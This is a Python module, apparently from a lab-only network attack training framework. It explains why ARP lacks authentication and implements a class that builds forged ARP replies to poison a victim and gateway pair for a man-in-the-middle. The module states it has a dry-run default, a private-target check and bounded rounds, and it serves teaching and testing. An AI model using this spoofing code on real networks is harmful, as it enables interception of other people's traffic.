"""ARP cache poisoning / spoofing (lab-only).

Protocol weakness
-----------------
ARP (RFC 826) has no authentication. A host that needs the MAC for an IP
broadcasts "who-has", and *any* host may answer "is-at". Worse, most stacks
accept **unsolicited** ARP replies and update their cache from them. So an
attacker on the same L2 segment can simply announce "the gateway (192.168.1.1)
is at *my* MAC" to a victim, and "the victim is at *my* MAC" to the gateway.
Both now send their traffic to the attacker — a man-in-the-middle on the LAN.

What this module does
---------------------
Builds the pair of gratuitous ARP replies that poison a victim<->gateway pair.
It is bounded (``max_packets``), rate-limited, defaults to dry-run, and refuses
to run unless the target is private and the lab flag is set. A real attacker
would re-send these continuously to keep the caches poisoned; here we send a
small, fixed number so the behaviour is observable without being disruptive.
"""

from __future__ import annotations

from ..core.packets import arp_reply
from .base import Attack


class ArpSpoofAttack(Attack):
    name = "arp-spoof"

    def __init__(
        self,
        *,
        victim_ip: str,
        victim_mac: str,
        gateway_ip: str,
        gateway_mac: str,
        attacker_mac: str,
        rounds: int = 3,
        **kwargs,
    ) -> None:
        # The "target" for safety purposes is the victim we are lying to.
        self.target_ip = victim_ip
        super().__init__(**kwargs)
        self.victim_ip = victim_ip
        self.victim_mac = victim_mac
        self.gateway_ip = gateway_ip
        self.gateway_mac = gateway_mac
        self.attacker_mac = attacker_mac
        self.rounds = max(1, int(rounds))

    def build_packets(self) -> list:
        packets = []
        for _ in range(self.rounds):
            # Tell the victim that the gateway is at the attacker's MAC.
            packets.append(
                arp_reply(
                    psrc=self.gateway_ip,
                    hwsrc=self.attacker_mac,
                    pdst=self.victim_ip,
                    hwdst=self.victim_mac,
                )
            )
            # Tell the gateway that the victim is at the attacker's MAC.
            packets.append(
                arp_reply(
                    psrc=self.victim_ip,
                    hwsrc=self.attacker_mac,
                    pdst=self.gateway_ip,
                    hwdst=self.gateway_mac,
                )
            )
        return packets
